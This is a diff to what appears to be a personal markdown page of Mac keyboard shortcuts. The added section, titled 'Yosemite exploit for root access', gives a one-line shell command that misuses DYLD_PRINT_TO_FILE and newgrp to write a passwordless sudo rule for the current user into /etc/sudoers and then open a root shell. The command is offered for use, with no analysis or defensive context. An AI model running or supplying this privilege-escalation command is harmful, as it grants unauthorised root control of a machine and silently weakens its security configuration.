@@ -28,3 +28,9 @@ SCREEN SHOT (DESKTOP) = CMD + SHIFT + 3
 CLOSE ACTIVE WINDOW = CMD + W
 EXIT PROGRAM = CMD + Q
 {% endhighlight %}
+
+## Yosemite exploit for root access: ##
+
+{% highlight bash %}
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
+{% endhighlight %}
